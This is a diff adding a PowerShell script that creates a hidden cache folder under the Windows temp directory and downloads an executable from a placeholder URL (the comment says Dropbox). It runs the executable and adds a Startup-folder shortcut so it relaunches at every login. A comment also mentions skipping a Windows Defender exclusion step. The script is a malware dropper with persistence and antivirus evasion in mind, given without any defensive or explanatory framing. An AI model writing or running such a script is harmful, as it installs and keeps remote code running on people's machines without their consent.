@@ -1,0 +1,41 @@
+# Define the executable filename as a variable
+$exeName = "this.exe"
+
+# Step 1: Create the directory C:\Windows\Temp\Cache
+try {
+    mkdir "$env:windir\temp\Cache" -ErrorAction Stop
+    Write-Host "Directory C:\Windows\Temp\Cache created successfully."
+} catch {
+    Write-Host "Failed to create directory: $_"
+}
+
+# Step 2: Skip the Windows Defender exclusion since it requires elevated privileges
+
+# Step 3: Download the file from Dropbox to C:\Windows\Temp\Cache
+try {
+    $hookurl = "dc"
+    $outputFile = "$env:windir\temp\Cache\$exeName"
+    Invoke-WebRequest -Uri $hookurl -OutFile $outputFile -ErrorAction Stop
+    Write-Host "$exeName downloaded successfully to C:\Windows\Temp\Cache."
+} catch {
+    Write-Host "Failed to download file: $_"
+}
+
+# Step 4: Execute the downloaded file
+try {
+    Start-Process $outputFile -ErrorAction Stop
+    Write-Host "$exeName executed successfully."
+} catch {
+    Write-Host "Failed to execute $exeName: $_"
+}
+
+# Step 5: Create a shortcut to the executable in the startup folder
+try {
+    $shortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$exeName.lnk"
+    $s = (New-Object -COM WScript.Shell).CreateShortcut($shortcutPath)
+    $s.TargetPath = $outputFile
+    $s.Save()
+    Write-Host "Shortcut for $exeName created successfully in Startup folder."
+} catch {
+    Write-Host "Failed to create shortcut: $_"
+}
